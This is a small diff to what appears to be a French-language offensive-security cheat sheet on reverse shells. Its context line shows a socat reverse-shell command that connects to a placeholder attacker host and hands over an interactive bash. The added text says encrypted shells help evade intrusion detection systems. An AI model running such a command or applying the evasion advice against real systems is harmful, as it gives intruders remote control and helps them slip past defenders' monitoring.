@@ -83,4 +83,5 @@ user@raspberrypi: ~$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty
 
 ## __Encrypted shell__
 
-Les shells chiffré sont très utile pour bypass les IDS
+Les shells chiffré sont très utile pour bypass les IDS car ils ne peuvent pas être lue à part si l'on a la clé de déchiffrement.
+
